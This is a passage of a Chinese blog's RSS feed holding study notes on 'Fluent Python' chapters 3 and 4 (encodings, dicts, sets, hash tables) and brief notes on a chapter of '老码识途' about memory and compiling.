&lt;p&gt;3.python自带了超过100种编解码器,用于在文本和字节之间相互转换.每个编解码器都有一个名称,如’utf_8’,而且经常有几个别名,如’utf8’,’utf-8’,’U8’.&lt;/p&gt;

&lt;p&gt;4.python3允许在源码中使用非ascii标识符.有些人不喜欢这么做.支持始终使用ascii标识符的人认为,这样便于所有人阅读和编辑代码.这些人没切中要害:源码应该便于目标群体阅读和编辑,而不是”所有人”.如果代码属于跨国公司,或者是开源的,想让来自世界各地的人作贡献,那么标识符应该使用英语,也就是说只能使用ascii字符.但是,如果你是巴西的一位老师,那么使用葡萄牙语正确拼写变量和函数名更便于学生阅读代码&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;In [81]: 笔='钢笔'

In [82]: print(笔)
钢笔
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;5.utf8的一在优势是,不管设备使用哪种字节序(大端或小端),生成的字节序列始终一致,因此不需要BOM(在文件头部的字节序标记,一些编辑器会给文件加BOM,如notepad).尽管如此,某些windows应用(如notepad)还是会在utf8编码的文件中添加BOM;而且,EXCEL会根据有没有BOM确定文件是不是UTF8编码&lt;/p&gt;

&lt;p&gt;6.需要在多台设备中或多种场合下运行的代码,一定不能依赖默认编码.打开文件时始终应该明确传入encoding参数,因为不同的设备使用的默认编码可能不同,有时隔一天也会发生变化&lt;/p&gt;

&lt;p&gt;7.&lt;code class=&quot;highlighter-rouge&quot;&gt;eval&lt;/code&gt;会把string表达的内容当作代码执行&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;In [89]: eval('print(111)')
111

In [90]: a='[1,2]'
In [91]: eval(a)
Out[91]: [1, 2]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;8.windows中,&lt;code class=&quot;highlighter-rouge&quot;&gt;locale.getpreferredencoding()&lt;/code&gt;返回的编码是最重要的:这是打开文件的默认编码,也是重定向到文件的sys.stdout/stdin/stderr的默认编码.关于编码默认值的最佳建议是:别依赖默认值&lt;/p&gt;

</description>
        <pubDate>Wed, 28 Feb 2018 00:00:00 -0500</pubDate>
        <link>http://3xp10it.cc/python/2018/02/28/%E6%B5%81%E7%95%85%E7%9A%84python%E7%AC%AC4%E7%AB%A0%E7%AC%94%E8%AE%B0/</link>
        <guid isPermaLink="true">http://localhost:4000/python/2018/02/28/%E6%B5%81%E7%95%85%E7%9A%84python%E7%AC%AC4%E7%AB%A0%E7%AC%94%E8%AE%B0/</guid>
        
        <category>python</category>
        
        
        <category>python</category>
        
      </item>
    
      <item>
        <title>流畅的python第3章笔记</title>
        <description>&lt;h3 id=&quot;字典和集合&quot;&gt;字典和集合&lt;/h3&gt;

&lt;p&gt;1.散列表是字典类型性能出众的根本原因&lt;/p&gt;

&lt;p&gt;2.字典推导&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;In [2]: dial_codes=[(86,'china'),(91,'india'),(1,'US')]

In [3]: country_code={country: code for code,country in dial_codes}

In [4]: country_code
Out[4]: {'US': 1, 'china': 86, 'india': 91}

In [5]: country_code={country.upper(): code for code,country in dial_codes}

In [6]: country_code
Out[6]: {'CHINA': 86, 'INDIA': 91, 'US': 1}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;3.大多数映射类型都提供了两个很强大的方法:&lt;code class=&quot;highlighter-rouge&quot;&gt;setdefault&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;update&lt;/code&gt;.setdefault方法可以用来更新字典里存放的可变值(比如列表),从而避免了重复的键搜索.&lt;code class=&quot;highlighter-rouge&quot;&gt;update&lt;/code&gt;方法则让批量更新成为可能,它可以用来插入新值或者更新已有键值对,它的参数可以是包含(key,value)这种键值对的可迭代对象,或者关键字参数.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;dict的setdefault用法&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;In [18]: a = {'runoob': '菜鸟教程', 'google': 'Google 搜索'}

In [19]: a.setdefault('test','lalala')
Out[19]: 'lalala'

In [20]: a
Out[20]: {'google': 'Google 搜索', 'runoob': '菜鸟教程', 'test': 'lalala'}

In [21]: a.setdefault('runoob','lalala')
Out[21]: '菜鸟教程'

In [22]: a
Out[22]: {'google': 'Google 搜索', 'runoob': '菜鸟教程', 'test': 'lalala'}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;dict的update用法&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;In [37]: a
Out[37]: {'dajiahao': 'shide', 'nihao': 'wohao'}

In [38]: b={'nihao':'lala'}

In [39]: a.update(b)

In [40]: a
Out[40]: {'dajiahao': 'shide', 'nihao': 'lala'}

In [41]: b={'sho':'lll'}

In [42]: a.update(b)

In [43]: a
Out[43]: {'dajiahao': 'shide', 'nihao': 'lala', 'sho': 'lll'}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;4.有时候为了方便起见,就算某个键在映射里不存在,我们也希望在通过这个键读取值的时候能得到一个默认值.有两个途径能帮我们达到这个目的.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;a.通过&lt;code class=&quot;highlighter-rouge&quot;&gt;collections.defaultdict&lt;/code&gt;这个类型而不是普通的dict&lt;/li&gt;
  &lt;li&gt;b.给自己定义一个dict的子类,然后在子类中实现&lt;code class=&quot;highlighter-rouge&quot;&gt;__missing__&lt;/code&gt;方法,如:&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;class StrKeyDict0(dict):

    def __missing__(self,key):
        if isinstance(key,str):
            raise KeyError(key)
        return self[str(key)]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;所有的映射类型在处理找不到的键的时候,都会牵扯到&lt;code class=&quot;highlighter-rouge&quot;&gt;__missing__&lt;/code&gt;方法.虽然基类dict并没有定义这个方法,但是dict是知道有这么个东西存在的.&lt;code class=&quot;highlighter-rouge&quot;&gt;__missing__&lt;/code&gt;方法只会被&lt;code class=&quot;highlighter-rouge&quot;&gt;__getitem__&lt;/code&gt;调用(比如在表达式&lt;code class=&quot;highlighter-rouge&quot;&gt;d[k]&lt;/code&gt;中)&lt;/p&gt;

&lt;p&gt;5.字典的变种&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;collections.OrderdDict&lt;/code&gt;:这个类型在添加键的时候会保持顺序,因此键的迭代次序问题一致的.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;collections.ChainMap&lt;/code&gt;:该类型可以容纳数个不同的映射对象,然后在进行键查找操作的时候,这些对象会被当作一个整体被逐个查找,直到键被找到为止.这个功能在给有嵌套作用域的语言做解释器的时候很有用,可以用一个映射对象来代表一个作用域的上下文&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;collections.Counter&lt;/code&gt;:这个映射类型会给键准备一个整数计数器.每次更新一个键的时候都会增加这个计数器&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;collections.UserDict&lt;/code&gt;:这个类其实就是把标准dict用纯python又实现了一遍.就创造自定义映射类型来说,以UserDict为基类,总比普通的dict为基类要来得方便,更倾向于从UserDict而不是从dict继承的主要原因是,后者有时会在某些方法的实现上走一些捷径,导致我们不得不在它的子类中重写这些方法,但是UserDict就不会带来这些问题&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;6.不可变的字典类型&lt;/p&gt;

&lt;p&gt;标准库里所有的映射类型都是可变的,但有时候你会有这样的需求,比如不能让用户错误地修改某个映射.从python3.3开始,types模块中引入了一个封装类名叫&lt;code class=&quot;highlighter-rouge&quot;&gt;MappingProxyType&lt;/code&gt;,如果给这个类一个映射,它会返回一个只读的映射视图.虽然是个只读视图,但是它是动态的.如下:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;In [44]: from types import MappingProxyType

In [45]: d={1:'A'}

In [46]: d_proxy=MappingProxyType(d)

In [47]: d_proxy
Out[47]: mappingproxy({1: 'A'})

In [48]: d_proxy[1]
Out[48]: 'A'

In [49]: d_proxy[2]='x'
---------------------------------------------------------------------------
TypeError                                 Traceback (most recent call last)
&amp;lt;ipython-input-49-cb84dba8e1f4&amp;gt; in &amp;lt;module&amp;gt;()
----&amp;gt; 1 d_proxy[2]='x'

TypeError: 'mappingproxy' object does not support item assignment

In [50]: d[2]='B'

In [51]: d_proxy
Out[51]: mappingproxy({1: 'A', 2: 'B'})

In [52]: d_proxy[2]
Out[52]: 'B'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;7.集合&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;a.&lt;code class=&quot;highlighter-rouge&quot;&gt;set&lt;/code&gt;是可变集合,&lt;code class=&quot;highlighter-rouge&quot;&gt;frozenset&lt;/code&gt;是不可变集合,区别在&lt;a href=&quot;http://blog.csdn.net/monkeyduck/article/details/18036381&quot;&gt;这里&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;b.集合的本质是许多唯一对象的聚集.因此,集合可以用于去重:&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;In [58]: a=[1,2,3,2]

In [59]: set(a)
Out[59]: {1, 2, 3}

In [60]: list(set(a))
Out[60]: [1, 2, 3]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;c.给定两个集合a和b,&lt;code class=&quot;highlighter-rouge&quot;&gt;a|b&lt;/code&gt;返回的是它们的合集,&lt;code class=&quot;highlighter-rouge&quot;&gt;a&amp;amp;b&lt;/code&gt;得到的交集,而&lt;code class=&quot;highlighter-rouge&quot;&gt;a-b&lt;/code&gt;得到的是差集.合理地利用这些操作,不仅能够让代码的行数变少,不能减少python程序的运行时间.这样做同时也是为了让代码更易读,从而更容易判断程序的正确性,因为利用这些运算符可以省去不必要的循环和逻辑操作&lt;/li&gt;
  &lt;li&gt;d.如果要创建一个空集,必须用不带任何参数的构造方法&lt;code class=&quot;highlighter-rouge&quot;&gt;set()&lt;/code&gt;.如果写成&lt;code class=&quot;highlighter-rouge&quot;&gt;{}&lt;/code&gt;的形式,跟以前一样,你创建的其实是个空字典.&lt;/li&gt;
  &lt;li&gt;e.像&lt;code class=&quot;highlighter-rouge&quot;&gt;{1,2,3}&lt;/code&gt;这种字面量句法相比于构造方法&lt;code class=&quot;highlighter-rouge&quot;&gt;set([1,2,3])&lt;/code&gt;要更快且更易读,原因如下:&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;In [61]: from dis import dis

In [62]: dis('{1,2,3}')
  1           0 LOAD_CONST               0 (1)
              2 LOAD_CONST               1 (2)
              4 LOAD_CONST               2 (3)
              6 BUILD_SET                3
              8 RETURN_VALUE

In [63]: dis('set([1,2,3])')
  1           0 LOAD_NAME                0 (set)
              2 LOAD_CONST               0 (1)
              4 LOAD_CONST               1 (2)
              6 LOAD_CONST               2 (3)
              8 BUILD_LIST               3
             10 CALL_FUNCTION            1
             12 RETURN_VALUE
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;f.python里没有针对frozenset的特殊字面量句法,只能采用构造方法,如下:&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;In [64]: frozenset([1,2,3])
Out[64]: frozenset({1, 2, 3})

In [69]: frozenset(range(10))
Out[69]: frozenset({0, 1, 2, 3, 4, 5, 6, 7, 8, 9})

In [67]: list(range(10))
Out[67]: [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]

In [68]: set(range(10))
Out[68]: {0, 1, 2, 3, 4, 5, 6, 7, 8, 9}

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;集合推导用法,如下:&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;In [70]: {i.upper() for i in 'abc'}
Out[70]: {'A', 'B', 'C'}

In [71]: {i.upper() for i in ['a','b','c']}
Out[71]: {'A', 'B', 'C'}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;8.dict和set的速度很快,如果在你的程序里有任何的磁盘输入/输出,那么不管查询有多少个元素的字典或集合,所耗费的时间都能忽略不计(前提是字典或集合不超过内存大小)&lt;/p&gt;

&lt;p&gt;9.相比之下,列表慢,列表的背后没有散列表来支持in运算符,每次搜索都需要扫描一次完整的列表,所以慢&lt;/p&gt;

&lt;p&gt;10.字典中的散列表
 python用散列表实现dict类型.散列表其实是一个稀疏数组(总是有空白元素的数组猜测为稀疏数组).在一般的数据结构教材中,散列表里的单元通常叫作表元.在dict的散列表中,每个键值对都占用一个表元,每个表元都有两个部分,一个是对键的引用,另一个是值的引用.因为所有表元的大小一致,所以可以通过偏移量来读取某个表元.如果要把一个对象放入散列表,那么首先要计算这个元素键的散列值.在插入新值时,python可能会按照散列表的拥挤程度来决定是不要重新分配内存为它扩容,如果增加了散列表的大小,那散列值所占的位数和用作索引的位数都会随之增加,这样做的目的是为了减少发生散列冲突的概率&lt;/p&gt;

&lt;p&gt;11.dict的实现及其导致的结果&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;1) 键必须是可散列的.一个或散列的对象必须满足以下要求:
    &lt;ul&gt;
      &lt;li&gt;a) 支持hash()函数,并且通过__hash__()方法所得到的散列值是不变的&lt;/li&gt;
      &lt;li&gt;b) 支持通过__eq__()方法来检测相等性&lt;/li&gt;
      &lt;li&gt;c) 若a==b为真,则hash(a)==hash(b)也为真
  所有由用户自定义的对象默认都是可散列的,因为它们的散列值由id()来获取,而且它们都是不相等的&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;2) 字典在内存上的开销巨大
  由于字典使用了散列表,而散列表又必须是稀疏的,这导致它在空间上的效率低下.举例而言,如果你需要存放数量巨大的记录,那么放在由元组或具名元组构成的列表中会是比较好的选择;最好不要根据json风格,用由字典组成的列表来存放这些记录.用元组取代字典就能节省空间的原因有两个:其一是避免了散列表所耗费的空间,其二是无需把记录中字段的名字在每个元素里都存一遍.不过,如果机器的内存足够用,还是用字典吧.&lt;/li&gt;
  &lt;li&gt;3) 键查询很快.dict的实现是典型的空间换时间(内存换查询速度),字典类型有关巨大的内存开销,但它们提供了无视数据量大小的快速访问–只要字典能被装在内存里&lt;/li&gt;
  &lt;li&gt;4) 键的次序取决于添加顺序.由dict([key1,value1],[key2,value2])和dict([key2,value2],[key1,value1])得到的两个字典,在进行比较的时候,它们是相等的&lt;/li&gt;
  &lt;li&gt;5) 往字典里添加关机键可能会改变已有键的顺序.无论何时往字典里添加新的键,python解释器都可能做出为字典扩容的决定.扩容导致的结果就是要新建一个更大的散列表,并把字典里已有的元素添加到新表里.这个过程可能会发生新的散列冲突,导致新散列表中键的次序变化.如果你在迭代一个字典的所有键的过程中同时对字典进行修改,那么这个循环很有可能会跳过一些键–甚至是跳过那些字典中已经有的键.由此可知,不要对字典同时进行迭代和修改,如果想扫描并修改一个字典,最好分成不同步来进行:首先对字典迭代,以得出需要添加的内容,把这些内容放在一个新字典里;迭代结束之后再对原有字典进行更新.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;12.set和frozenset的实现也依赖散列表,但在它们的散列表里存放的只有元素的引用(就像在字典里只存放键而没有相应的值).字典和散列表的特点对集合来说几乎都是适用的,如下:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;集合里的元素必须是可散列的&lt;/li&gt;
  &lt;li&gt;集合很消耗内存&lt;/li&gt;
  &lt;li&gt;可以很高效地判断元素是不存在于某个集合&lt;/li&gt;
  &lt;li&gt;元素的次序取决于被添加到集合里的次序&lt;/li&gt;
  &lt;li&gt;往集合里添加元素,可能会改变集合里已有元素的次序&lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Mon, 26 Feb 2018 00:00:00 -0500</pubDate>
        <link>http://3xp10it.cc/python/2018/02/26/%E6%B5%81%E7%95%85%E7%9A%84python%E7%AC%AC3%E7%AB%A0%E7%AC%94%E8%AE%B0/</link>
        <guid isPermaLink="true">http://localhost:4000/python/2018/02/26/%E6%B5%81%E7%95%85%E7%9A%84python%E7%AC%AC3%E7%AB%A0%E7%AC%94%E8%AE%B0/</guid>
        
        <category>python</category>
        
        
        <category>python</category>
        
      </item>
    
      <item>
        <title>老码识途第3章笔记</title>
        <description>&lt;h3 id=&quot;成长-与程序一起茁壮&quot;&gt;成长: 与程序一起茁壮&lt;/h3&gt;

&lt;p&gt;1.局部变量在栈上分配,全局变量在执行文件的数据段中分配&lt;/p&gt;

&lt;p&gt;2.引用计数:每个内存块上有一个字段叫引用计数,存储当前使用该块内存的使用者数目.当一段代码要使用它时,调用一个函数将引用计数加1;不使用时,调用另一个函数将引用计数减1,当该函数判断计数归0时,就释放该内存&lt;/p&gt;

&lt;p&gt;3.便于测试的代码就是良好设计的代码.如果发现程序难以用代码来测试,实际已经发出了警告,可能代码设计不好,如可能是界面控制代码和逻辑层代码”绞”在一起了&lt;/p&gt;

&lt;p&gt;4.c1编译链接命令,编译:&lt;code class=&quot;highlighter-rouge&quot;&gt;c1 /c 1.cpp 2.cpp 3.cpp&lt;/code&gt;,链接:&lt;code class=&quot;highlighter-rouge&quot;&gt;link 1.obj 2.obj 3.obj&lt;/code&gt;,如果c1命令不加”/c”选项,编译和链接将一起完成&lt;/p&gt;
</description>
        <pubDate>Mon, 05 Feb 2018 00:00:00 -0500</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2018/02/05/%E8%80%81%E7%A0%81%E8%AF%86%E9%80%94%E7%AC%AC3%E7%AB%A0%E7%AC%94%E8%AE%B0/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2018/02/05/%E8%80%81%E7%A0%81%E8%AF%86%E9%80%94%E7%AC%AC3%E7%AB%A0%E7%AC%94%E8%AE%B0/</guid>
        
        <category>老码识途</category>
        
        
        <category>二进制</category>
        
      </item>
    
  </channel>
</rss>
